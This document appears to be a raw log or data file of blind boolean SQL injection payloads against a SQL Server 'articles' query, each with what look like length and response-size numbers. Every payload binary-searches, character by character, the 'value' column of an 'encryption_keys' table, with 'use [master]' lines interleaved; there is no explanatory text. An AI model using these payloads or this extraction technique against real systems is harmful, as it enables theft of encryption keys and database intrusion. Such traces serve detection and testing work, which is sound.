+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>104	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>108	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>110	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>111	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>112	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>104	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>108	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>110	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>109	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>112	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>104	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>100	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>102	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>103	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>112	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>120	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>116	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>114	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>113	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>112	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>104	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>100	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>98	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>97	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>112	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>120	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>116	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>114	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>115	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>112	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>120	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>116	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>118	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>117	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>112	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>104	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>108	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>106	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>107	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>100	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>98	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>97	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>112	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>120	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>116	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>114	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>115	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>104	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>108	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>106	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>105	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>96	409
+	200
+use [master]	86
+	165
